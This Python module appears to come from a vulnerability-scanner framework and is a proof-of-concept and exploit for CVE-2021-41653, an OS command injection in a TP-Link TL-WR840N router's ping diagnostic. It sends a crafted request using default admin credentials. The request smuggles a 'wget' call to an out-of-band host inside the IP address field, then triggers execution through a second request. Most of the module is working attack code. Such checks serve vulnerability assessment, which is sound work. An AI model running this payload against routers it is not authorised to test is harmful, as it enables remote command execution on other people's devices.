import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''TP-Link - OS Command Injection''',
        "description": '''The PING function on the TP-Link TL-WR840N EU v5 router with firmware through TL-WR840N(EU)_V5_171211 is vulnerable to remote code execution via a specially crafted payload in an IP address input field.''',
        "severity": "critical",
        "references": [
            "https://k4m1ll0.com/cve-2021-41653.html", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-41653", 
            "https://www.tp-link.com/us/press/security-advisory/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-41653",
            "cwe-id": "CWE-94"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "tplink", "rce", "router"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/cgi?2"""
        method = "POST"
        data = """[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6
dataBlockSize=64
timeout=1
numberOfRepetitions=4
host=$(echo 127.0.0.1; wget http://oob_domain)
X_TP_ConnName=ewan_ipoe_d
diagnosticsState=Requested"""
        headers = {'Content-Type': 'text/plain', 'Referer': 'http://{{Hostname}}/mainFrame.htm', 'Cookie': 'Authorization=Basic YWRtaW46YWRtaW4='}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/cgi?7"""
        method = "POST"
        data = """[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0"""
        headers = {'Content-Type': 'text/plain', 'Referer': 'http://{{Hostname}}/mainFrame.htm', 'Cookie': 'Authorization=Basic YWRtaW46YWRtaW4='}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url